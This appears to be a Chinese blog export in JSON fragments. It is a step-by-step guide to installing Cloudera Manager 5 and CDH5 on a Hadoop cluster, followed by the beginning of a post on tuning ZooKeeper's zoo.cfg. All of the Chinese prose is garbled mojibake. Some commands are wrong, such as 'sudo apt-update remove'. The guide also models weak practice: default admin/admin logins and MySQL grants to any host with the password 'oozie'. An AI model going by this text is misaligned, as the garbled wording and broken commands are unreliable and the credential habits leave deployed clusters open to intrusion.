Features.é€‰æ‹©æ³¨å†Œå’Œå•å‡»Submit æˆ–åˆ™ç›´æ¥å•å‡»ä¸‹è½½é¡µé“¾æ¥ï¼ˆ download pageï¼‰ï¼Œä¸‹è½½ cloudera-manager-installer.binæ–‡ä»¶Pre-requisites: multiple, Internet-connected Linux machines, with SSH access, and significant free space in /var and /opt.1. ä¸‹è½½cloudera-manager-installer.bin$ wget http://archive.cloudera.com/cm5/installer/latest/cloudera-manager-installer.bin2.æ”¹å˜ cloudera-manager-installer.bin çš„æ‰§è¡Œæƒé™$ chmod u+x cloudera-manager-installer.binå¤åˆ¶ä»£ç 3.æ‰§è¡Œ cloudera-manager-installer.bin$ sudo ./cloudera-manager-installer.binå¤åˆ¶ä»£ç 4.æŒ‰ç…§cloudera-managerçš„README æ¥å®‰è£…5.é˜…è¯»Cloudera Manager Express Licenseï¼Œç„¶åæŒ‰ç…§æç¤ºé€‰æ‹©YESæ¥ç¡®å®šæ¥å—æˆæƒï¼ˆlicenseï¼‰6.è¯»å– Oracle äºŒè¿›åˆ¶ Code æˆæƒè®¸å¯åè®®ï¼Œç„¶åå®‰è£… 7.å½“å®‰è£…å®Œæˆï¼ŒCloudera Manager ç®¡ç†æ§åˆ¶å°ä¼šæä¾›ä¸€ä¸ªå®Œæˆçš„urlåŒ…æ‹¬é»˜è®¤ç«¯å£7180æˆ‘è¿™ç§æ–¹æ³•æ˜¯åœ¨çº¿å®‰è£…æ–¹å¼ï¼Œå°±è¯´ç›´æ¥ç”¨.binè®©ç³»ç»Ÿè‡ªåŠ¨ä¸‹è½½éœ€è¦çš„jdkå’Œcmç®¡ç†åŒ…ã€‚ å¦‚æœç½‘ç»œå·®å»ºè®®ç”¨ç¦»çº¿å®‰è£…æ–¹å¼ã€‚ å…ˆåœ¨æœ¬åœ°æ­å»ºä¸€ä¸ªCreating a Local Yum Repository:ä¸‹è½½ç‹¬ç«‹çš„åŒ…è·¯å¾„ï¼šcm need package å®‰è£…å®Œæˆä»¥åæœåŠ¡ä¹Ÿå¯åŠ¨ã€‚ è¿™é‡Œæ˜¾ç¤ºå®‰è£…æˆåŠŸï¼Œè®¿é—®åœ°å€ï¼Œå¦‚æœç¦»çº¿å®‰è£…ä¸åˆ°è¿™ä¸€æ­¥ä¸èƒ½æ“ä½œï¼Œä¼šæç¤ºæŠ¥é”™æŒ‡ç¤ºã€‚å…ˆæ‰‹åŠ¨ä¸‹è½½å¥½åŒ…rpmå®‰è£…ä¸Šå³å¯ã€‚ å®‰è£…ç›®å½•è¯¦æƒ…ï¼š1234é»˜è®¤å®‰è£…ç›®å½•ï¼š/opt/clouderaæ—¥å¿—ç›®å½•ï¼š/var/log/cloudera-scm-serverå¯åŠ¨æœåŠ¡ï¼š[root@yancy cloudera-scm-server]# /etc/init.d/cloudera-scm-server statuscloudera-scm-server (pid 2723) æ­£åœ¨è¿è¡Œ... æŸ¥çœ‹å¯åŠ¨è¿›ç¨‹ç«¯å£ï¼š12345678[root@cdm opt]# netstat -ntulp | grep javatcp 0 0 0.0.0.0:7180 0.0.0.0:* LISTEN 25780/javatcp 0 0 0.0.0.0:7182 0.0.0.0:* LISTEN 25780/java è®¿é—®åœ°å€ï¼šhttp://cdm.jollychic.com:7180 ç™»å½•Cloudera Manager Admin æ§åˆ¶Username: admin Password: admin. ä½¿ç”¨Cloudera Manager å‘å¯¼å®‰è£…å’Œé…ç½®è½¯ä»¶clouderaé¦–é¡µï¼š 1. æ·»åŠ æœåŠ¡å™¨é›†ç¾¤ï¼šåœ¨é›†ç¾¤ä¸»æœºä¸Šå®‰è£…å’Œé…ç½®Cloudera Manager ï¼ŒCDHï¼Œå’Œç®¡ç†æœåŠ¡è½¯ä»¶åŒ…æ‹¬ä»¥ä¸‹ä¸‰ä¸ªä¸»è¦æ­¥éª¤é€‰æ‹© Cloudera Manager ç‰ˆæœ¬ å’ŒæŒ‡å®šä¸»æœº 2. é€‰æ‹©å…è´¹ç‰ˆï¼Œaddç»§ç»­ 3. æ˜¾ç¤ºçš„æ˜¯å®‰è£…Cloudera Manageråé¢å¯ä»¥å®‰è£…çš„æœåŠ¡çš„è½¯ä»¶åŒ… 4. è¿™é‡Œéœ€è¦è¯´æ˜çš„æ˜¯æŒ‡å®šä¸»æœºå®‰è£…æœ‰å¤šç§æ–¹å¼ï¼š1231.ç›´æ¥åˆ—å‡ºipæˆ–åˆ™hostï¼Œå¤šå°ä»¥é€—å·ã€åˆ†å·ã€åˆ¶è¡¨ç¬¦ã€ç©ºæ ¼æˆ–æ”¾ç½®åœ¨å•ç‹¬çš„è¡Œã€‚2.æŒ‡å®šipçš„åœ°å€èŒƒå›´ä¾‹å¦‚ï¼š10.1.1.[1-4] æˆ–åˆ™ host[1-3].hadoop.com.3.è®°å¾—æŒ‡å®šçš„ä¸»æœºéœ€è¦å…³é—­é˜²ç«å¢™ï¼Œï¼ˆå¦‚æœé‡åˆ°ä¸èƒ½å®‰è£…ï¼Œæœ€å¥½ä½¿ç”¨å®‰è£…cloudera managerè™šæ‹Ÿæœºè¿›è¡Œå¤åˆ¶ï¼‰é€‰æ‹©éœ€è¦å®‰è£…çš„Hadoop datanodeæœåŠ¡å™¨ï¼šè¿™é‡Œæˆ‘ä»¬çº¿ä¸Šè®¿é—®ç«¯å£ä¸æ˜¯22æ˜¯58958 æ˜¾ç¤ºå¦‚ä¸‹å›¾è¯´æ˜æœºå™¨é€šä¿¡æ²¡é—®é¢˜ã€‚ 5. å®‰è£…CDHé€‰æ‹©å®‰è£…æ–¹å¼å½“æˆ‘ä»¬é€‰æ‹©å®‰è£…çš„hostä¹‹åï¼Œæˆ‘ä»¬éœ€è¦é€‰æ‹©CDHçš„å®‰è£…æ–¹å¼ï¼ˆæ–¹æ³•ï¼‰ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤º 6. è¿™é‡Œç‚¹å‡»å®‰è£…Javaå·¥å…·åŒ… 7. è¿™é‡ŒæŠŠéœ€è¦å®‰è£…çš„HadoopæœåŠ¡å™¨rootå¯†ç è®¾ç½®ä¸€æ ·ï¼Œæˆ–è€…ä½¿ç”¨å…¶ä»–ç”¨æˆ·ä¹Ÿå¯ä»¥ï¼Œåªè¦æœ‰sudoæƒé™éƒ½å¯ä»¥ã€‚ 8.å®‰è£…è¿™é‡Œå¦‚æœæç¤ºå‡ºç°æŠ¥é”™ï¼šæŸ¥çœ‹å¥½æ–‡ Cloudera Manager5 åœ¨çº¿binå®‰è£…é‡åˆ° æ— æ³•æ£€æµ‹åˆ° Agent å‘å‡ºçš„æ£€æµ‹ä¿¡å· æ€»ç»“12345è¿™é‡Œåªéœ€è¦å¸è½½ï¼šyum remove cloudera-manager-agent å¦‚æœæƒ³é‡æ–°å®‰è£…å¯ä»¥å¸è½½æ‰€æœ‰ï¼šyum remove cloudera-manager-repository cloudera-manager-agent cloudera-manager-daemons cloudera-manager-server-db cloudera-manager-server -y 9.é›†ç¾¤å®‰è£…å›¾1 è¿™æ˜¯ä¸€ä¸ªå¾ˆæ¼«é•¿çš„è¿‡ç¨‹ï¼Œä¸å¹¸çš„æ˜¯åœ¨ä¸‹è½½å®Œæ¯•ï¼Œæ‰§è¡Œåˆ†å‘çš„æ—¶å€™ï¼Œè¿™ä¸ªè¿‡ç¨‹è¢«æ‰“æ–­ï¼Œå®‰è£…è¢«ç»ˆæ­¢ã€‚å¯¼è‡´å›ä¸åˆ°å›¾2ï¼Œè¿™ä¸ªè¯¥å¦‚ä½•è§£å†³ï¼Ÿ éš¾é“çœŸçš„è¦é‡è£…å—ï¼ŸèŠ±è´¹äº†å¤§åŠå¤©åŠŸå¤«ï¼Œåˆä¸å¾—ä¸é‡æ¥ã€‚è¿™é‡Œé¢çš„é—®é¢˜æ˜¯æ‰¾ä¸åˆ°cloudera manager5æ‰€ç®¡ç†çš„èŠ‚ç‚¹äº†ï¼Ÿ è®°å¾—aboutäº‘æœ‰è¿™ç¯‡æ–‡ç« å¸è½½ Cloudera Manager 5.1.x.å’Œ ç›¸å…³è½¯ä»¶ã€å®˜ç½‘ç¿»è¯‘ï¼šé«˜å¯ç”¨ã€‘ä½†æ˜¯è¿™ç¯‡æ–‡ç« æ˜¯å¸è½½Cloudera Managerä»¥åŠCDHçš„ï¼Œç”±äºcloudera-scm-serverå’Œcloudera-scm-agentæŸ¥çœ‹éƒ½æ˜¯è¿è¡Œæ­£å¸¸çš„ï¼Œå¦‚ä½•æŸ¥çœ‹çŠ¶æ€ï¼Œå¯ä»¥å‚è€ƒï¼š Cloudera Manager Server5åŠCloudera Manager Agents5å‘½ä»¤æ•´ç†ï¼ˆaboutäº‘ï¼‰ï¼Œæ‰€ä»¥cloudera managerä¸éœ€è¦å¸è½½ï¼Œå¸è½½çš„æ˜¯CDHçš„ç›¸å…³å†…å®¹ã€‚äºæ˜¯æ‰§è¡Œä¸‹é¢å‘½ä»¤ï¼š 123456789sudo apt-update remove avro-tools crunch flume-ng hadoop-hdfs-fuse hadoop-hdfs-nfs3 hadoop-httpfs hbase-solr hive-hbase hive-webhcat hue-beeswax hue-hbase hue-impala hue-pig hue-plugins hue-rdbms hue-search hue-spark hue-sqoop hue-zookeeper impala impala-shell kite llama mahout oozie pig pig-udf-datafu search sentry solr-mapreduce spark-python sqoop sqoop2 whirrå¤åˆ¶ä»£ç sudo apt-get cleanå¤åˆ¶ä»£ç sudo rm -Rf /var/lib/flume-ng /var/lib/hadoop* /var/lib/hue /var/lib/navigator /var/lib/oozie /var/lib/solr /var/lib/sqoop* /var/lib/zookeeperå¤åˆ¶ä»£ç sudo rm -Rf /dfs /mapred /yarnå¤åˆ¶ä»£ç é€šè¿‡ä¸Šé¢ç»ˆäºæ‰¾åˆ°æ‰€ç®¡ç†çš„ä¸‰ä¸ªèŠ‚ç‚¹ã€‚ç„¶åä»æ–°ç™»å½•ï¼Œé€‰æ‹©ä¸‰ä¸ªä¸»æœºï¼Œç„¶åç»§ç»­ç»§ç»­ï¼Œæœ€åç»ˆäºè¿›å…¥äº†è¿™ä¸ªç•Œé¢ã€‚ä½†æ˜¯ç»†å¿ƒçš„åŒå­¦ä¼šå‘ç°è¿™é‡Œå·²ç»æ›´æ¢ä¸ºä¸­æ–‡ç‰ˆæœ¬ã€‚å› ä¸ºè¿™æ˜¯é€šè¿‡å®¿ä¸»ä¸»æœºè®¿é—®çš„ã€‚è€Œå‰é¢æ˜¯åœ¨è™šæ‹Ÿæœºé‡Œä½¿ç”¨firefoxè®¿é—®çš„ã€‚ æˆåŠŸåˆ°è¿™ä¸€æ­¥ï¼šé›†ç¾¤å®‰è£… 10.é€‰æ‹©é›†ç¾¤è®¾ç½® 10.1 é›†ç¾¤è®¾ç½®ï¼šè‡ªå®šä¹‰è§’è‰²åˆ†é…è®¾ç½®å¥½è§’è‰²åˆ†é…æŸ¥çœ‹ä¸»æœºï¼š 11. æ•°æ®åº“è®¾ç½® âœ¨âœ¨ è¿™é‡Œä½¿ç”¨é»˜è®¤è®¾ç½®ï¼Œå¡«å†™MySQLæœåŠ¡å™¨IPï¼Œç»™äºˆMySQL ç”¨æˆ·åå’Œå¯†ç allæƒé™ï¼Œä¸ç„¶ä¼šæç¤ºæƒé™ä¸è¶³ã€‚ 1234567891011121314151617Create the Oozie Database and Oozie MySQL UserFor example, using the MySQL mysql command-line tool:$ mysql -u root -pEnter password:mysql&gt; create database oozie default character set utf8;Query OK, 1 row affected (0.00 sec)mysql&gt; grant all privileges on oozie.* to 'oozie'@'localhost' identified by 'oozie';Query OK, 0 rows affected (0.00 sec)mysql&gt; grant all privileges on oozie.* to 'oozie'@'%' identified by 'oozie';Query OK, 0 rows affected (0.00 sec)mysql&gt; exitBye é€‰æ‹©ç„¶åå•å‡»æµ‹è¯•è¿æ¥å³å¯ã€‚ æµ‹è¯• Activity Monitor çš„æ•°æ®åº“è¿æ¥JDBC driver cannot be found. Unable to find the JDBC database jar on host : wlj-cdm. 1234567891011121314151617å¦‚æœå‡ºç°éœ€è¦MySQLé©±åŠ¨,ä¸‹è½½å¯¹åº”ç‰ˆæœ¬é©±åŠ¨ï¼Œcopyåˆ°ç›¸åº”ç›®å½•/usr/share/java/ ç»Ÿä¸€å»æ‰ç‰ˆæœ¬å·.å‚è€ƒInstalling the MySQL JDBC Driverå®˜ç½‘æ–‡æ¡£ï¼šhttps://www.cloudera.com/documentation/enterprise/latest/topics/cm_ig_mysql.html#### Installing the MySQL JDBC Driver Download the MySQL JDBC driver from http://www.mysql.com/downloads/connector/j/5.1.html.Extract the JDBC driver JAR file from the downloaded file. For example:### $ wget https://dev.mysql.com/get/Downloads/Connector-J/mysql-connector-java-5.1.44.tar.gz### $ tar zxvf mysql-connector-java-5.1.31.tar.gzCopy the JDBC driver, renamed, to the relevant host. For example:### $ sudo cp mysql-connector-java-5.1.31/mysql-connector-java-5.1.31-bin.jar /usr/share/java/mysql-connector-java.jarIf the target directory does not yet exist on this host, you can create it before copying the JAR file. For example:### $ sudo mkdir -p /usr/share/java/### $ sudo cp mysql-connector-java-5.1.31/mysql-connector-java-5.1.31-bin.jar /usr/share/java/mysql-connector-java.jar 12. å®¡æ ¸æ›´æ”¹(è¿™é‡Œé€‰æ‹©é»˜è®¤è·¯å¾„)ç­‰å¾…å®‰è£…ï¼š 13. å®‰è£…æˆåŠŸ äº¤æµå­¦ä¹ ï¼šğŸ§ Linux shell_é«˜çº§è¿ç»´æ´¾: 459096184 åœˆå­ (ç³»ç»Ÿè¿ç»´-åº”ç”¨è¿ç»´-è‡ªåŠ¨åŒ–è¿ç»´-è™šæ‹ŸåŒ–æŠ€æœ¯ç ”ç©¶æ¬¢è¿åŠ å…¥)ğŸ§ BigData-Exchange School : 521621407 åœˆå­ï¼ˆå¤§æ•°æ®è¿ç»´)ï¼ˆHadoopå¼€å‘äººå‘˜)ï¼ˆå¤§æ•°æ®ç ”ç©¶çˆ±å¥½è€…) æ¬¢è¿åŠ å…¥ ç›¸åº”Bidataæœ‰å†…éƒ¨å¾®ä¿¡äº¤æµç¾¤äº’ç›¸å­¦ä¹ ï¼ŒåŠ å…¥QQç¾¤æœ‰é“¾æ¥ã€‚","link":"/2017/07/29/Bigdata-hadoop/countly/Cloudera Manager5åŠCDH5å®‰è£…æŒ‡å¯¼/"},{"title":"Bigdata-ZooKeeperçš„é…ç½®è¯¦è§£ä¼˜åŒ–","text":"å‰è¨€ZooKeeperçš„åŠŸèƒ½ç‰¹æ€§é€šè¿‡ ZooKeeper é…ç½®æ–‡ä»¶æ¥è¿›è¡Œæ§åˆ¶ç®¡ç†ï¼ˆ zoo.cfg é…ç½®æ–‡ä»¶ï¼‰ã€‚ ZooKeeper è¿™æ ·çš„è®¾è®¡å…¶å®æ˜¯æœ‰å®ƒè‡ªèº«çš„åŸå› çš„ã€‚é€šè¿‡å‰é¢å¯¹ ZooKeeper çš„é…ç½®å¯ä»¥çœ‹å‡ºï¼Œå¯¹ ZooKeeperé›†ç¾¤è¿›è¡Œé…ç½®çš„æ—¶å€™ï¼Œå®ƒçš„é…ç½®æ–‡æ¡£æ˜¯å®Œå…¨ç›¸åŒçš„ï¼ˆå¯¹äºé›†ç¾¤ä¼ªåˆ†å¸ƒæ¨¡å¼æ¥è¯´ï¼Œåªæœ‰å¾ˆå°‘çš„éƒ¨åˆ†æ˜¯ä¸åŒçš„ï¼‰ã€‚è¿™æ ·çš„é…ç½®æ–¹ä½¿å¾—åœ¨éƒ¨ç½² ZooKeeper æœåŠ¡çš„æ—¶å€™éå¸¸åœ°æ–¹ä¾¿ã€‚å¦å¤–ï¼Œå¦‚æœæœåŠ¡å™¨ä½¿ç”¨ä¸åŒçš„é…ç½®æ–‡ä»¶ï¼Œå¿…é¡»è¦ç¡®ä¿ä¸åŒé…ç½®æ–‡ä»¶ä¸­çš„æœåŠ¡å™¨åˆ—è¡¨ç›¸åŒ¹é…ã€‚ åœ¨è®¾ç½® ZooKeeper é…ç½®æ–‡æ¡£çš„æ—¶å€™ï¼ŒæŸäº›å‚æ•°æ˜¯å¯é€‰çš„ï¼Œä½†æ˜¯æŸäº›å‚æ•°æ˜¯å¿…é¡»çš„ã€‚è¿™äº›å¿…é¡»çš„å‚æ•°å°±æ„æˆäº†ZooKeeper é…ç½®æ–‡æ¡£çš„æœ€ä½é…ç½®è¦æ±‚ã€‚ æœ€è¿‘å‘ç°åœ¨ç”¨zookeeperå‡ºç°ç»å¸¸å‡ºç°è¿æ¥è¶…æ—¶ï¼Œå‡ºç°è¿æ¥ä¸­æ–­ï¼Œæ•°æ®ä¸¢å¤±ç­‰åŸå› ã€‚åé¢çœ‹äº†å®˜ç½‘é…ç½®è‡ªå·±æ•´ç†ä¼˜åŒ–å‡ ç‚¹ï¼š12345678910111213141516171819202122232425262.1é”™è¯¯æ—¥å¿—ï¼š2016-04-11 15:00:58,981 [myid:] - WARN [SyncThread:0:FileTxnLog@334] - fsync-ing the write ahead log in SyncThread:0 took 13973ms which will adversely effect operation latency. See the ZooKeeper troubleshooting guide&gt;2.2ï¼Œé”™è¯¯åŸå› åˆ†æâ€œFOLLOWERâ€åœ¨è·Ÿâ€œLEADERâ€åŒæ­¥æ—¶ï¼Œfsyncæ“ä½œæ—¶é—´è¿‡é•¿ï¼Œå¯¼è‡´è¶…æ—¶ã€‚ç¬¬ä¸€æ­¥ï¼šåˆ†ææœåŠ¡å™¨é—®é¢˜ï¼šæˆ‘æŸ¥çœ‹äº†æœåŠ¡å™¨ioå’Œè´Ÿè½½éƒ½ä¸é«˜ã€‚å†…å­˜ç©ºé—´å®é™…ä½¿ç”¨ç‡ä¸é«˜ã€‚å¯æ˜¯ç¼–è¾‘æ–‡ä»¶å‡ºç°äº†å¡é¡¿.å¯ä»¥å‘ç°ï¼šæœåŠ¡å™¨å¹¶æ²¡æœ‰å ç”¨å¾ˆå¤šå†…å­˜çš„è¿›ç¨‹ï¼›æœåŠ¡å™¨ä¹Ÿæ²¡æœ‰å­˜åœ¨å¾ˆå¤šçš„è¿›ç¨‹ï¼›cat /var/log/messageæŸ¥çœ‹ç³»ç»Ÿæ—¥å¿—å¹¶æ²¡æœ‰å‘ç°ä»€ä¹ˆå¼‚å¸¸ï¼›å¦å¤–pingæœåŠ¡å™¨åªæœ‰0.1mså¤šçš„å»¶è¿Ÿï¼Œå› æ­¤ä¸æ˜¯ç½‘ç»œé—®é¢˜ã€‚åé¢å‘ç°ç¡¬ç›˜æœ‰æ•…éšœé‡æ–°æ›´æ¢äº†ä¸€å—ç¡¬ç›˜ã€‚æˆ–è€…æ›´æ¢æœåŠ¡å™¨ã€‚&gt;2.3ï¼Œé”™è¯¯è§£å†³å¢åŠ â€œtickTimeâ€æˆ–è€…â€œinitLimitå’ŒsyncLimitâ€çš„å€¼ï¼Œæˆ–è€…ä¸¤è€…éƒ½å¢å¤§ã€‚&gt;2.4ï¼Œå…¶ä»–è¿™ä¸ªé”™è¯¯åœ¨ä¸Šçº¿â€œä½¿ç”¨ZooKeeperè·å–åœ°å€æ–¹æ¡ˆâ€ä¹‹å‰ä¹Ÿå­˜åœ¨ï¼Œåªä¸è¿‡è¿‡æ²¡æœ‰è¿™ä¹ˆé«˜é¢‘ç‡ï¼Œè€Œä¸Šçº¿äº†â€œZooKeeperè·å–åœ°å€æ–¹æ¡ˆâ€ä¹‹åï¼ŒZooKeeper Serverä¹‹é—´çš„åŒæ­¥æ•°æ®é‡å¢å¤§ï¼ŒZooKeeper Serverçš„è´Ÿè½½åŠ é‡ï¼Œå› è€Œæœ€ç»ˆå¯¼è‡´é«˜é¢‘ç‡å‡ºç°ä¸Šè¿°é”™è¯¯ã€‚ ä¸‹é¢æ˜¯åœ¨æœ€ä½é…ç½®è¦æ±‚ä¸­å¿…é¡»é…ç½®çš„å‚æ•°ï¼š1234567891011121314151617### æœ€å°é…ç½®æœ€å°é…ç½®æ„å‘³ç€æ‰€æœ‰çš„é…ç½®æ–‡ä»¶ä¸­å¿…é¡»è¦åŒ…å«è¿™äº›é…ç½®é€‰é¡¹ã€‚#### clientPortæœåŠ¡å™¨ç›‘å¬å®¢æˆ·ç«¯è¿æ¥çš„ç«¯å£, äº¦å³å®¢æˆ·ç«¯å°è¯•è¿æ¥åˆ°æœåŠ¡å™¨ä¸Šçš„æŒ‡å®šç«¯å£ã€‚##### dataDirZooKeeper å­˜å‚¨å†…å­˜æ•°æ®åº“å¿«ç…§æ–‡ä»¶çš„è·¯å¾„, å¹¶ä¸”å¦‚æœæ²¡æœ‰æŒ‡å®šå…¶å®ƒè·¯å¾„çš„è¯, æ•°æ®åº“æ›´æ–°çš„äº‹åŠ¡æ—¥å¿—ä¹Ÿå°†å­˜å‚¨åˆ°è¯¥è·¯å¾„ä¸‹ã€‚æ³¨æ„: äº‹åŠ¡æ—¥å¿—ä¼šå½±å“ ZooKeeper æœåŠ¡å™¨çš„æ•´ä½“æ€§èƒ½, æ‰€ä»¥å»ºè®®å°†äº‹åŠ¡æ—¥å¿—æ”¾ç½®åˆ°ç”± dataLogDir å‚æ•°æŒ‡å®šçš„è·¯å¾„ä¸‹ã€‚##### tickTimeå•ä¸ª tick çš„æ—¶é—´é•¿åº¦, å®ƒæ˜¯ ZooKeeper ä¸­ä½¿ç”¨çš„åŸºæœ¬æ—¶é—´å•å…ƒ, ä»¥æ¯«ç§’ä¸ºå•ä½ã€‚å®ƒç”¨æ¥è°ƒèŠ‚å¿ƒè·³å’Œè¶…æ—¶æ—¶é—´ã€‚ä¾‹å¦‚, æœ€å°ä¼šè¯è¶…æ—¶æ—¶é—´æ˜¯ 2 ä¸ª tickã€‚ ç”Ÿäº§ç¯å¢ƒé…ç½®ä¾‹å­ï¼š12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849501.tickTimeï¼šCSé€šä¿¡å¿ƒè·³æ•°Zookeeper æœåŠ¡å™¨ä¹‹é—´æˆ–å®¢æˆ·ç«¯ä¸æœåŠ¡å™¨ä¹‹é—´ç»´æŒå¿ƒè·³çš„æ—¶é—´é—´éš”ï¼Œä¹Ÿå°±æ˜¯æ¯ä¸ª tickTime æ—¶é—´å°±ä¼šå‘é€ä¸€ä¸ªå¿ƒè·³ã€‚tickTimeä»¥æ¯«ç§’ä¸ºå•ä½ã€‚tickTime=2000 2.initLimitï¼šLFåˆå§‹é€šä¿¡æ—¶é™é›†ç¾¤ä¸­çš„followeræœåŠ¡å™¨(F)ä¸leaderæœåŠ¡å™¨(L)ä¹‹é—´åˆå§‹è¿æ¥æ—¶èƒ½å®¹å¿çš„æœ€å¤šå¿ƒè·³æ•°ï¼ˆtickTimeçš„æ•°é‡ï¼‰ã€‚initLimit=5 3.syncLimitï¼šLFåŒæ­¥é€šä¿¡æ—¶é™é›†ç¾¤ä¸­çš„followeræœåŠ¡å™¨ä¸leaderæœåŠ¡å™¨ä¹‹é—´è¯·æ±‚å’Œåº”ç­”ä¹‹é—´èƒ½å®¹å¿çš„æœ€å¤šå¿ƒè·³æ•°ï¼ˆtickTimeçš„æ•°é‡ï¼‰ã€‚syncLimit=2 4.dataDirï¼šæ•°æ®æ–‡ä»¶ç›®å½•Zookeeperä¿å­˜æ•°æ®çš„ç›®å½•ï¼Œé»˜è®¤æƒ…å†µä¸‹ï¼ŒZookeeperå°†å†™æ•°æ®çš„æ—¥å¿—æ–‡ä»¶ä¹Ÿä¿å­˜åœ¨è¿™ä¸ªç›®å½•é‡Œã€‚dataDir=/data/tools/zookeeper/data5.dataLogDirï¼šæ—¥å¿—æ–‡ä»¶ç›®å½•Zookeeperä¿å­˜æ—¥å¿—æ–‡ä»¶çš„ç›®å½•ã€‚dataLogDir=/data/tools/zookeeper/log 6.clientPortï¼šå®¢æˆ·ç«¯è¿æ¥ç«¯å£å®¢æˆ·ç«¯è¿æ¥ Zookeeper æœåŠ¡å™¨çš„ç«¯å£ï¼ŒZookeeper ä¼šç›‘å¬è¿™ä¸ªç«¯å£ï¼Œæ¥å—å®¢æˆ·ç«¯çš„è®¿é—®è¯·æ±‚ã€‚clientPort=2333 7.æœåŠ¡å™¨åç§°ä¸åœ°å€ï¼šé›†ç¾¤ä¿¡æ¯ï¼ˆæœåŠ¡å™¨ç¼–å·ï¼ŒæœåŠ¡å™¨åœ°å€ï¼ŒLFé€šä¿¡ç«¯å£ï¼Œé€‰ä¸¾ç«¯å£ï¼‰è¿™ä¸ªé…ç½®é¡¹çš„ä¹¦å†™æ ¼å¼æ¯”è¾ƒç‰¹æ®Šï¼Œè§„åˆ™å¦‚ä¸‹ï¼šserver.N=YYY:A:B å…¶ä¸­Nè¡¨ç¤ºæœåŠ¡å™¨ç¼–å·ï¼ŒYYYè¡¨ç¤ºæœåŠ¡å™¨çš„IPåœ°å€ï¼ŒAä¸ºLFé€šä¿¡ç«¯å£ï¼Œè¡¨ç¤ºè¯¥æœåŠ¡å™¨ä¸é›†ç¾¤ä¸­çš„leaderäº¤æ¢çš„ä¿¡æ¯çš„ç«¯å£ã€‚Bä¸ºé€‰ä¸¾ç«¯å£ï¼Œè¡¨ç¤ºé€‰ä¸¾æ–°leaderæ—¶æœåŠ¡å™¨é—´ç›¸äº’é€šä¿¡çš„ç«¯å£ï¼ˆå½“leaderæŒ‚æ‰æ—¶ï¼Œå…¶ä½™æœåŠ¡å™¨ä¼šç›¸äº’é€šä¿¡ï¼Œé€‰æ‹©å‡ºæ–°çš„leaderï¼‰ã€‚ä¸€èˆ¬æ¥è¯´ï¼Œé›†ç¾¤ä¸­æ¯ä¸ªæœåŠ¡å™¨çš„Aç«¯å£éƒ½æ˜¯ä¸€æ ·ï¼Œæ¯ä¸ªæœåŠ¡å™¨çš„Bç«¯å£ä¹Ÿæ˜¯ä¸€æ ·ã€‚ä½†æ˜¯å½“æ‰€é‡‡ç”¨çš„ä¸ºä¼ªé›†ç¾¤æ—¶ï¼ŒIPåœ°å€éƒ½ä¸€æ ·ï¼Œåªèƒ½æ—¶Aç«¯å£å’ŒBç«¯å£ä¸ä¸€æ ·ã€‚ä¸‹é¢æ˜¯ä¸€ä¸ªéä¼ªé›†ç¾¤çš„ä¾‹å­ï¼šserver.0=233.34.9.144:2008:6008 server.1=233.34.9.145:2008:6008 server.2=233.34.9.146:2008:6008 server.3=233.34.9.147:2008:6008 ä¸‹é¢æ˜¯ä¸€ä¸ªä¼ªé›†ç¾¤çš„ä¾‹å­ï¼šserver.0=127.0.0.1:2008:6008 server.1=127.0.0.1:2007:6007 server.2=127.0.0.1:2006:6006 server.3=127.0.0.1:2005:6005 é«˜çº§é…ç½® (å®˜ç½‘ç¿»è¯‘)æœ¬èŠ‚çš„é…ç½®é€‰é¡¹æ˜¯å¯é€‰çš„ã€‚ä½ å¯ä»¥ä½¿ç”¨å®ƒä»¬è¿›ä¸€æ­¥çš„ä¼˜åŒ– ZooKeeper æœåŠ¡å™¨çš„è¡Œä¸ºã€‚æœ‰äº›å¯ä»¥ä½¿ç”¨ Java ç³»ç»Ÿå±æ€§æ¥è®¾ç½®, ä¸€èˆ¬çš„æ ¼å¼æ˜¯ â€œzookeeper.keywordâ€ã€‚å¦‚æœæœ‰å…·ä½“çš„ç³»ç»Ÿå±æ€§, ä¼šåœ¨é…ç½®é€‰é¡¹ä¸‹é¢æ ‡æ³¨å‡ºæ¥ã€‚ dataLogDiræ²¡æœ‰å¯¹åº”çš„ Java ç³»ç»Ÿå±æ€§ã€‚ è¯¥å‚æ•°ç”¨äºé…ç½® ZooKeeper æœåŠ¡å™¨å­˜å‚¨äº‹åŠ¡æ—¥å¿—æ–‡ä»¶çš„è·¯å¾„, ZooKeeper é»˜è®¤å°†äº‹åŠ¡æ—¥å¿—æ–‡ä»¶å’Œæ•°æ®å¿«ç…§å­˜å‚¨åœ¨åŒä¸€ä¸ªç›®å½•ä¸‹, åº”å°½é‡å°†å®ƒä»¬åˆ†å¼€å­˜å‚¨ã€‚ æ³¨æ„: å°†äº‹åŠ¡æ—¥å¿—æ–‡ä»¶å­˜å‚¨åˆ°ä¸€ä¸ªä¸“é—¨çš„æ—¥å¿—è®¾å¤‡ä¸Šå¯¹äºæœåŠ¡å™¨çš„ååé‡å’Œç¨³å®šçš„å»¶è¿Ÿæœ‰å¾ˆå¤§çš„å½±å“ã€‚äº‹åŠ¡æ—¥å¿—å¯¹ç£ç›˜æ€§èƒ½è¦æ±‚æ¯”è¾ƒé«˜, ä¸ºäº†ä¿è¯æ•°æ®ä¸€è‡´æ€§, ZooKeeper åœ¨å“åº”å®¢æˆ·ç«¯äº‹åŠ¡è¯·æ±‚ä¹‹å‰, éœ€è¦å°†è¯·æ±‚çš„äº‹åŠ¡æ—¥å¿—å†™åˆ°ç£ç›˜ä¸Š, æ‰€ä»¥äº‹åŠ¡æ—¥å¿—çš„å†™å…¥æ€§èƒ½ç›´æ¥å½±å“ ZooKeeper æœåŠ¡å™¨å¤„ç†è¯·æ±‚çš„ååã€‚æ‰€ä»¥å»ºè®®ç»™äº‹åŠ¡æ—¥å¿—çš„è¾“å‡ºé…ç½®ä¸€ä¸ªå•ç‹¬çš„ç£ç›˜æˆ–è€…æŒ‚è½½ç‚¹ã€‚ globalOutstandingLimitå¯¹åº”çš„ Java ç³»ç»Ÿå±æ€§: zookeeper.globalOutstandingLimitã€‚ å®¢æˆ·ç«¯æäº¤è¯·æ±‚çš„é€Ÿåº¦å¯èƒ½æ¯” ZooKeeper å¤„ç†çš„é€Ÿåº¦å¿«å¾—å¤š, ç‰¹åˆ«æ˜¯å½“å®¢æˆ·ç«¯çš„æ•°é‡éå¸¸å¤šçš„æ—¶å€™ã€‚ä¸ºäº†é˜²æ­¢ ZooKeeper å› ä¸ºæ’é˜Ÿçš„è¯·æ±‚è€Œè€—å°½å†…å­˜, ZooKeeper 